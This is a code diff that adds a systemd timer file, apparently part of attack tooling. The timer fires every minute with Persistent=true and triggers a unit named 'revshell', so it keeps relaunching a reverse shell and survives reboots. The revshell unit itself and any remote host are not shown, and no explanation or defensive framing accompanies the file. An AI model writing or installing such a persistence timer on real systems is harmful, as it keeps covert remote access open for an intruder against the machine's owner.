@@ -1,0 +1,7 @@
+[Timer]
+AccuracySec=1s
+OnCalendar=*-*-* *:*:00
+Unit=revshell
+RandomizedDelaySec=4s
+Persistent=true
+
